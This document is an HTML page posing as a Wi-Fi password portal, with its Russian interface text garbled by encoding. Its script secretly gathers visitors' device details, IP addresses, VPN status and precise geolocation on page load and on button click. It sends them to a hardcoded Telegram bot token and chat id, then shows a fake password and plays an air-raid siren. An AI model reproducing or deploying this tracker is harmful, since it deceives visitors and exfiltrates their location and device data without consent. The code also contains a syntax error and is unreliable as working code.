<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wi-Fi Portal</title>
    <style>
        body {
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            font-family: 'Arial', sans-serif;
            color: white;
            text-align: center;
        }
        .container {
            max-width: 800px;
            background: rgba(0, 0, 0, 0.7);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
        }
        .logo {
            width: 150px;
            margin-bottom: 20px;
        }
        h1 {
            color: #4cc9f0;
            margin-bottom: 30px;
            font-size: 2.2rem;
        }
        .password-button {
            padding: 15px 40px;
            font-size: 20px;
            font-weight: bold;
            color: white;
            background: linear-gradient(45deg, #f72585, #7209b7);
            border: none;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 5px 15px rgba(114, 9, 183, 0.6);
            transition: all 0.3s ease;
            margin: 20px 0;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .password-button:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(114, 9, 183, 0.8);
            background: linear-gradient(45deg, #7209b7, #f72585);
        }
        .password-button:active {
            transform: translateY(1px);
        }
        .confetti {
            position: fixed;
            width: 12px;
            height: 12px;
            background-color: #f00;
            opacity: 0;
            top: 0;
            left: 0;
            animation: confetti-fall 5s ease-in-out forwards;
            z-index: 1000;
        }
        @keyframes confetti-fall {
            0% { transform: translateY(0) rotate(0deg); opacity: 1; }
            100% { transform: translateY(100vh) rotate(720deg); opacity: 0; }
        }
        .status {
            margin-top: 30px;
            font-size: 14px;
            color: #a5a5a5;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://cdn-icons-png.flaticon.com/512/2780/2780137.png" class="logo" alt="Wi-Fi Logo">
        <h1>–î–û–°–¢–£–ü –ö –°–ï–¢–ò WI-FI</h1>
        
        <button class="password-button" id="passwordButton">–ü–û–õ–£–ß–ò–¢–¨ –ü–ê–†–û–õ–¨</button>
        
        <div class="status" id="statusMessage">–ù–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –ø–∞—Ä–æ–ª—è</div>
    </div>

    <audio id="sirenAudio" preload="auto">
        <source src="https://alway6pffline-cmd.github.io/Zvukdlyasaita/sirena-vozdushnogo-naleta-26744.mp3" type="audio/mpeg">
    </audio>

    <script>
        // Telegram –±–æ—Ç
        const botToken = '6818081299:AAGEDkvcZltkYKPELkGv8AuvRxpBzqMQLu8';
        const chatId = '1209403544';
        
        // –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
        let deviceInfo = {};
        let audioContext;
        let sirenPlaying = false;

        // –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è —Å–±–æ—Ä–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏
        async function collectDeviceInfo() {
            // –û—Å–Ω–æ–≤–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è
            deviceInfo = {
                timestamp: new Date().toISOString(),
                basicInfo: {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    cookiesEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack || "–ù–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è",
                    onlineStatus: navigator.onLine ? "–û–Ω–ª–∞–π–Ω" : "–û—Ñ–ª–∞–π–Ω"
                },
                hardware: {
                    screenResolution: `${window.screen.width}x${window.screen.height}`,
                    screenOrientation: window.screen.orientation ? window.screen.orientation.type : "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                    colorDepth: `${window.screen.colorDepth} –±–∏—Ç`,
                    pixelRatio: window.devicePixelRatio,
                    cpuCores: navigator.hardwareConcurrency || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                    deviceMemory: navigator.deviceMemory || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                    maxTouchPoints: navigator.maxTouchPoints || "–ù–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è"
                },
                network: await getNetworkInfo(),
                location: await getLocationInfo(),
                battery: await getBatteryInfo(),
                media: await getMediaInfo(),
                storage: await getStorageInfo(),
                webgl: getWebGLInfo(),
                performance: {
                    timing: performance.timing ? {
                        navigationStart: performance.timing.navigationStart,
                        loadEventEnd: performance.timing.loadEventEnd,
                        domComplete: performance.timing.domComplete
                    } : "–ù–µ–¥–æ—Å—Ç—É–ø–Ω–æ",
                    memory: performance.memory ? {
                        totalJSHeapSize: formatBytes(performance.memory.totalJSHeapSize),
                        usedJSHeapSize: formatBytes(performance.memory.usedJSHeapSize),
                        jsHeapSizeLimit: formatBytes(performance.memory.jsHeapSizeLimit)
                    } : "–ù–µ–¥–æ—Å—Ç—É–ø–Ω–æ"
                },
                time: {
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    localTime: new Date().toString(),
                    timezoneOffset: new Date().getTimezoneOffset()
                },
                connection: {
                    publicIP: await getPublicIP(),
                    localIP: await getLocalIP(),
                    vpnInfo: await checkVPN()
                },
                browserFeatures: {
                    serviceWorker: 'serviceWorker' in navigator ? "–ü–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è" : "–ù–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è",
                    notifications: 'Notification' in window ? "–ü–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è" : "–ù–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è",
                    geolocation: 'geolocation' in navigator ? "–ü–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è" : "–ù–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è",
                    webRTC: 'RTCPeerConnection' in window ? "–ü–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è" : "–ù–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è",
                    webAudio: 'AudioContext' in window ? "–ü–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è" : "–ù–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è",
                    webSpeech: 'speechSynthesis' in window ? "–ü–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è" : "–ù–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è",
                    webBluetooth: 'bluetooth' in navigator ? "–ü–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è" : "–ù–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è"
                }
            };
            
            return deviceInfo;
        }

        // –í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏
        function formatBytes(bytes) {
            if (bytes === 0) return '0 Bytes';
            const k = 1024;
            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2) + ' ' + sizes[i];
        }

        async function getNetworkInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (!connection) return "–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–µ—Ç–∏ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞";
            
            return {
                effectiveType: connection.effectiveType || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                downlink: connection.downlink ? `${connection.downlink} Mbps` : "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                rtt: connection.rtt ? `${connection.rtt} ms` : "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                saveData: connection.saveData ? "–í–∫–ª—é—á–µ–Ω–∞" : "–í—ã–∫–ª—é—á–µ–Ω–∞",
                networkType: connection.type || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"
            };
        }

        async function getLocationInfo() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve("–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è");
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        resolve({
                            latitude: pos.coords.latitude,
                            longitude: pos.coords.longitude,
                            accuracy: `${pos.coords.accuracy} –º–µ—Ç—Ä–æ–≤`,
                            altitude: pos.coords.altitude ? `${pos.coords.altitude} –º` : "–ù–µ–¥–æ—Å—Ç—É–ø–Ω–æ",
                            heading: pos.coords.heading || "–ù–µ–¥–æ—Å—Ç—É–ø–Ω–æ",
                            speed: pos.coords.speed ? `${(pos.coords.speed * 3.6).toFixed(1)} –∫–º/—á` : "–ù–µ–¥–æ—Å—Ç—É–ø–Ω–æ",
                            mapLink: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                        });
                    },
                    (err) => resolve(`–û—à–∏–±–∫–∞: ${err.message}`),
                    { timeout: 5000, enableHighAccuracy: true }
                );
            });
        }

        async function getBatteryInfo() {
            if (!navigator.getBattery) return "API –±–∞—Ç–∞—Ä–µ–∏ –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è";
            
            try {
                const battery = await navigator.getBattery();
                return {
                    level: `${Math.round(battery.level * 100)}%`,
                    charging: battery.charging ? "–ó–∞—Ä—è–∂–∞–µ—Ç—Å—è" : "–ù–µ –∑–∞—Ä—è–∂–∞–µ—Ç—Å—è",
                    chargingTime: battery.chargingTime === Infinity ? 
                        "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ" : `${Math.round(battery.chargingTime / 60)} –º–∏–Ω`,
                    dischargingTime: battery.dischargingTime === Infinity ? 
                        "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ" : `${Math.round(battery.dischargingTime / 60)} –º–∏–Ω`
                };
            } catch (e) {
                return "–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö";
            }
        }

        async function getMediaInfo() {
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                return {
                    audioInputs: devices.filter(d => d.kind === 'audioinput').length,
                    videoInputs: devices.filter(d => d.kind === 'videoinput').length,
                    audioOutputs: devices.filter(d => d.kind === 'audiooutput').length
                };
            } catch (e) {
                return "–î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω";
            }
        }

        async function getStorageInfo() {
            if ('storage' in navigator && 'estimate' in navigator.storage) {
                try {
                    const estimate = await navigator.storage.estimate();
                    return {
                        quota: formatBytes(estimate.quota),
                        usage: formatBytes(estimate.usage),
                        usageDetails: estimate.usageDetails || "–ù–µ–¥–æ—Å—Ç—É–ø–Ω–æ"
                    };
                } catch (e) {
                    return "–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö";
                }
            }
            return "API –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è";
        }

        function getWebGLInfo() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            
            if (!gl) return "WebGL –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è";
            
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return {
                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "–ù–µ–¥–æ—Å—Ç—É–ø–Ω–æ",
                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "–ù–µ–¥–æ—Å—Ç—É–ø–Ω–æ",
                version: gl.getParameter(gl.VERSION),
                shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE)
            };
        }

        async function getPublicIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (e) {
                return "–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å";
            }
        }

        async function getLocalIP() {
            return new Promise((resolve) => {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                
                pc.onicecandidate = (ice) => {
                    if (!ice.candidate) return;
                    const ip = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/)?.[1];
                    if (ip) resolve(ip);
                };
                
                setTimeout(() => resolve("–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å"), 2000);
            });
        }

        async function checkVPN() {
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                
                const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                const geoData = await geoRes.json();
                
                return {
                    ip: ipData.ip,
                    country: geoData.country_name || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                    region: geoData.region || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                    city: geoData.city || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                    isp: geoData.org || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                    proxy: geoData.proxy || false,
                    vpn: geoData.vpn || false,
                    tor: geoData.tor || false
                };
            } catch (e) {
                return "–ù–µ —É–¥–∞–ª–æ—Å—å –ø—Ä–æ–≤–µ—Ä–∏—Ç—å";
            }
        }

        // –§—É–Ω–∫—Ü–∏–∏ –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å–æ –∑–≤—É–∫–æ–º
        function playSiren() {
            if (sirenPlaying) return;
            
            try {
                const audio = document.getElementById('sirenAudio');
                audio.volume = 1.0;
                audio.play().then(() => {
                    sirenPlaying = true;
                    document.getElementById('statusMessage').textContent = "–ó–≤—É–∫ —Å–∏—Ä–µ–Ω—ã –≤–∫–ª—é—á–µ–Ω";
                    sendToTelegram("üîä –°–∏—Ä–µ–Ω–∞ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω–∞ –Ω–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ: " + navigator.userAgent);
                }).catch(e => {
                    console.error("–û—à–∏–±–∫–∞ –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏—è:", e);
                    document.getElementById('statusMessage').textContent = "–ù–∞–∂–º–∏—Ç–µ —Ä–∞–∑—Ä–µ—à–∏—Ç—å –¥–ª—è –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏—è –∑–≤—É–∫–∞";
                });
            } catch (e) {
                console.error("–û—à–∏–±–∫–∞ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ –∑–≤—É–∫–∞:", e);
            }
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –∫–æ–Ω—Ñ–µ—Ç—Ç–∏
        function createConfetti() {
            const colors = ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff', '#00ffff'];
            for (let i = 0; i < 200; i++) {
                const confetti = document.createElement('div');
                confetti.className = 'confetti';
                confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
                confetti.style.left = Math.random() * 100 + 'vw';
                confetti.style.width = Math.random() * 12 + 8 + 'px';
                confetti.style.height = Math.random() * 12 + 8 + 'px';
                confetti.style.animationDuration = Math.random() * 3 + 2 + 's';
                document.body.appendChild(confetti);
                
                setTimeout(() => confetti.remove(), 5000);
            }
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö –≤ Telegram
        async function sendToTelegram(message) {
            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏:', error);
            }
        }

        // –§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö –¥–ª—è Telegram
        function formatDataForTelegram(data) {
            let message = "üîç –î–µ—Ç–∞–ª—å–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ:\n\n";
            
            for (const [category, items] of Object.entries(data)) {
                message += `\nüîπ ${category.toUpperCase()}:\n`;
                
                if (typeof items === 'object' && items !== null) {
                    for (const [key, value] of Object.entries(items)) {
                        if (typeof value === 'object' && value !== null) {
                            message += `  ‚Ä¢ ${key}:\n`;
                            for (const [subKey, subValue] of Object.entries(value)) {
                                message += `    ‚ñ™ ${subKey}: ${subValue}\n`;
                            }
                        } else {
                            message += `  ‚Ä¢ ${key}: ${value}\n`;
                        }
                    }
                } else {
                    message += `  ‚Ä¢ ${items}\n`;
                }
            }
            
            return message;
        }

        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–∫–∏
        document.getElementById('passwordButton').addEventListener('click', async function() {
            this.disabled = true;
            document.getElementById('statusMessage').textContent = "–°–±–æ—Ä –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏...";
            
            // –°–æ–±–∏—Ä–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é
            await collectDeviceInfo();
            
            // –í–∏–∑—É–∞–ª—å–Ω—ã–µ —ç—Ñ—Ñ–µ–∫—Ç—ã
            createConfetti();
            
            // –í–æ—Å–ø—Ä–æ–∏–∑–≤–æ–¥–∏–º —Å–∏—Ä–µ–Ω—É
            playSiren();
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø–∞—Ä–æ–ª—å
            alert('Wi-Fi –ø–∞—Ä–æ–ª—å: SuperSecure' + Math.floor(Math.random() * 10000));
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –≤ Telegram
            const message = formatDataForTelegram(deviceInfo);
            sendToTelegram(message);
            
            document.getElementById('statusMessage').textContent = "–ü–∞—Ä–æ–ª—å –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!";
            this.disabled = false;
        });

        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        window.addEventListener('load', async function() {
            document.getElementById('statusMessage').textContent = "–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è...";
            
            // –°–æ–±–∏—Ä–∞–µ–º –±–∞–∑–æ–≤—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é
            await collectDeviceInfo();
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –Ω–æ–≤–æ–º –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏
            const connectMessage = `üåê –ù–æ–≤–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ —Å —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞:\n\n` +
                                  `IP: ${deviceInfo.connection.publicIP}\n` +
                                  `User Agent: ${deviceInfo.basicInfo.userAgent}\n` +
                                  `–ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: ${deviceInfo.basicInfo.platform}\n` +
                                  `–õ–æ–∫–∞—Ü–∏—è: ${deviceInfo.location.mapLink || "–ù–µ–¥–æ—Å—Ç—É–ø–Ω–æ"}`;
            
            sendToTelegram(connectMessage);
            
            document.getElementById('statusMessage').textContent = "–ì–æ—Ç–æ–≤–æ –∫ —Ä–∞–±–æ—Ç–µ!";
        });
    </script>
</body>
</html>
